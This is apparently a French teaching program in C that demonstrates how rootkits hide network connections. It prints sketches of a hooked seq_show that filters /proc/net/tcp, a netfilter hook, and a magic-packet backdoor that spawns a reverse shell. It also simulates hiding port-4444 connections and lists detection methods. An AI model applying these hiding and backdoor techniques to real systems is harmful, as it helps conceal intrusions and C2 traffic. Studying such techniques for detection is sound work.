/*
 * OBJECTIF  : Comprendre le masquage de connexions reseau
 * PREREQUIS : Bases C, sockets, /proc/net, netfilter
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques de masquage de connexions
 * reseau : hook de seq_show pour /proc/net/tcp, netfilter hooks,
 * et comment les rootkits cachent leurs communications C2.
 * Demonstration pedagogique en userspace.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>

/*
 * Etape 1 : Comment les connexions sont visibles
 */
static void explain_network_visibility(void) {
    printf("[*] Etape 1 : Visibilite des connexions reseau\n\n");

    printf("    Les connexions sont visibles via :\n\n");

    printf("    ┌────────────────────────────────────────────────┐\n");
    printf("    │  ss / netstat                                  │\n");
    printf("    │       │                                        │\n");
    printf("    │       v                                        │\n");
    printf("    │  /proc/net/tcp    <- connexions TCP            │\n");
    printf("    │  /proc/net/tcp6   <- connexions TCP IPv6       │\n");
    printf("    │  /proc/net/udp    <- connexions UDP            │\n");
    printf("    │  /proc/net/unix   <- sockets Unix              │\n");
    printf("    │       │                                        │\n");
    printf("    │       v                                        │\n");
    printf("    │  seq_operations -> seq_show()                  │\n");
    printf("    │  Le kernel itere sur les connections           │\n");
    printf("    │  et appelle seq_show() pour chaque entree      │\n");
    printf("    └────────────────────────────────────────────────┘\n\n");

    printf("    Pour cacher une connexion :\n");
    printf("    -> Hooker seq_show() de /proc/net/tcp\n");
    printf("    -> Ne pas afficher les lignes avec nos ports\n\n");
}

/*
 * Etape 2 : Lire /proc/net/tcp
 */
static void demo_proc_net_tcp(void) {
    printf("[*] Etape 2 : Lecture de /proc/net/tcp\n\n");

    FILE *fp = fopen("/proc/net/tcp", "r");
    if (!fp) {
        printf("    (impossible de lire /proc/net/tcp)\n\n");
        return;
    }

    char line[512];
    int count = 0;

    /* Header */
    if (fgets(line, sizeof(line), fp)) {
        line[strcspn(line, "\n")] = '\0';
        printf("    %s\n", line);
    }

    printf("    (entrees decodees) :\n");
    printf("    %-22s %-22s %s\n", "Local", "Remote", "State");
    printf("    %-22s %-22s %s\n", "──────────────────────",
           "──────────────────────", "──────");

    while (fgets(line, sizeof(line), fp) && count < 10) {
        unsigned int local_ip, local_port;
        unsigned int remote_ip, remote_port;
        unsigned int state;

        if (sscanf(line, " %*d: %X:%X %X:%X %X",
                   &local_ip, &local_port,
                   &remote_ip, &remote_port, &state) == 5) {

            struct in_addr la, ra;
            la.s_addr = local_ip;
            ra.s_addr = remote_ip;

            char local_str[32], remote_str[32];
            snprintf(local_str, sizeof(local_str), "%s:%u",
                     inet_ntoa(la), local_port);
            snprintf(remote_str, sizeof(remote_str), "%s:%u",
                     inet_ntoa(ra), remote_port);

            const char *state_str = "?";
            switch (state) {
                case 0x01: state_str = "ESTABLISHED"; break;
                case 0x02: state_str = "SYN_SENT"; break;
                case 0x06: state_str = "TIME_WAIT"; break;
                case 0x0A: state_str = "LISTEN"; break;
            }

            printf("    %-22s %-22s %s\n", local_str, remote_str, state_str);
            count++;
        }
    }
    fclose(fp);
    if (count == 0)
        printf("    (aucune connexion TCP active)\n");
    printf("\n");
}

/*
 * Etape 3 : Technique de masquage kernel
 */
static void explain_hiding_technique(void) {
    printf("[*] Etape 3 : Techniques de masquage reseau\n\n");

    printf("    Technique 1 : Hook de seq_show() pour /proc/net/tcp\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    // Trouver la seq_operations de /proc/net/tcp\n");
    printf("    struct file *tcp_file = filp_open(\"/proc/net/tcp\", ...);\n");
    printf("    struct seq_file *sf = tcp_file->private_data;\n");
    printf("    orig_seq_show = sf->op->show;\n");
    printf("    // Remplacer par notre version\n");
    printf("    sf->op->show = hooked_seq_show;\n\n");

    printf("    int hooked_seq_show(struct seq_file *sf, void *v) {\n");
    printf("        // Appeler l'original\n");
    printf("        int ret = orig_seq_show(sf, v);\n");
    printf("        // Verifier si la derniere ligne contient notre port\n");
    printf("        char *buf = sf->buf + sf->count;\n");
    printf("        if (strstr(buf, hidden_port_hex)) {\n");
    printf("            // Effacer cette ligne\n");
    printf("            sf->count = prev_count;\n");
    printf("        }\n");
    printf("        return ret;\n");
    printf("    }\n\n");

    printf("    Technique 2 : Netfilter hook\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    // Intercepter les paquets au niveau netfilter\n");
    printf("    struct nf_hook_ops hook_ops = {\n");
    printf("        .hook     = hook_func,\n");
    printf("        .hooknum  = NF_INET_LOCAL_IN,\n");
    printf("        .pf       = PF_INET,\n");
    printf("        .priority = NF_IP_PRI_FIRST,\n");
    printf("    };\n");
    printf("    // Peut aussi servir a creer un reverse shell\n");
    printf("    // declenche par un paquet magique\n\n");

    printf("    Technique 3 : Hook de recvmsg()\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    // Intercepter les donnees recues par les sockets\n");
    printf("    // Utile pour un sniffer invisible\n\n");
}

/*
 * Etape 4 : Simulation de filtrage
 */
static void demo_hiding_simulation(void) {
    printf("[*] Etape 4 : Simulation de masquage de connexions\n\n");

    unsigned int hidden_port = 4444;
    printf("    Port a cacher : %u\n\n", hidden_port);

    FILE *fp = fopen("/proc/net/tcp", "r");
    if (!fp) {
        printf("    (impossible de lire /proc/net/tcp)\n\n");
        return;
    }

    char line[512];
    int visible = 0, hidden = 0;

    /* Skip header */
    fgets(line, sizeof(line), fp);

    printf("    Connexions APRES filtrage (port %u cache) :\n", hidden_port);
    while (fgets(line, sizeof(line), fp)) {
        unsigned int local_ip, local_port;
        unsigned int remote_ip, remote_port;
        unsigned int state;

        if (sscanf(line, " %*d: %X:%X %X:%X %X",
                   &local_ip, &local_port,
                   &remote_ip, &remote_port, &state) == 5) {

            /* Filtrage : cacher si le port correspond */
            if (local_port == hidden_port || remote_port == hidden_port) {
                hidden++;
                continue;
            }

            if (visible < 8) {
                struct in_addr la;
                la.s_addr = local_ip;
                printf("      %s:%u (state=%x)\n", inet_ntoa(la), local_port, state);
            }
            visible++;
        }
    }
    fclose(fp);

    printf("      ...\n");
    printf("    Visible : %d, Cache : %d\n", visible, hidden);
    if (hidden)
        printf("    [!] %d connexions sur le port %u ont ete cachees !\n",
               hidden, hidden_port);
    else
        printf("    (aucune connexion sur le port %u a cacher)\n", hidden_port);
    printf("\n");
}

/*
 * Etape 5 : Backdoor par paquet magique (concept)
 */
static void explain_magic_packet(void) {
    printf("[*] Etape 5 : Backdoor par paquet magique (concept)\n\n");

    printf("    Le rootkit ecoute au niveau netfilter (NF_INET_PRE_ROUTING).\n");
    printf("    Quand un paquet avec un motif specifique arrive :\n");
    printf("    -> Le rootkit execute une action (reverse shell, etc.)\n\n");

    printf("    unsigned int hook_func(void *priv,\n");
    printf("        struct sk_buff *skb, ...) {\n");
    printf("        struct iphdr *iph = ip_hdr(skb);\n");
    printf("        struct tcphdr *tcph = tcp_hdr(skb);\n\n");
    printf("        // Verifier le paquet magique\n");
    printf("        if (ntohs(tcph->dest) == MAGIC_PORT &&\n");
    printf("            check_magic_payload(skb)) {\n");
    printf("            // Extraire l'IP et le port de callback\n");
    printf("            spawn_reverse_shell(callback_ip, callback_port);\n");
    printf("            return NF_DROP;  // Ne pas traiter le paquet\n");
    printf("        }\n");
    printf("        return NF_ACCEPT;\n");
    printf("    }\n\n");

    printf("    Avantages :\n");
    printf("    - Pas de port en ecoute visible\n");
    printf("    - Declenche a la demande\n");
    printf("    - Le paquet est absorbe (pas de trace)\n\n");
}

/*
 * Etape 6 : Detection
 */
static void explain_detection(void) {
    printf("[*] Etape 6 : Detection du masquage reseau\n\n");

    printf("    1. Comparer /proc/net/tcp avec les sockets reelles\n");
    printf("       -> ss -tnp vs lecture directe du kernel\n\n");

    printf("    2. Capture externe (autre machine/switch)\n");
    printf("       -> Le trafic existe sur le reseau meme s'il est cache\n");
    printf("       -> tcpdump sur une machine adjacente\n\n");

    printf("    3. eBPF tracing\n");
    printf("       -> Tracer les appels connect/accept au niveau kernel\n");
    printf("       -> bpftrace, tetragon\n\n");

    printf("    4. Netstat via appel syscall direct\n");
    printf("       -> Bypass les hooks de /proc\n\n");

    printf("    5. Analyse du trafic (IDS/IPS)\n");
    printf("       -> Snort, Suricata : detectent le trafic C2\n\n");
}

int main(void) {
    printf("[*] Demo : Network Hiding\n\n");

    explain_network_visibility();
    demo_proc_net_tcp();
    explain_hiding_technique();
    demo_hiding_simulation();
    explain_magic_packet();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
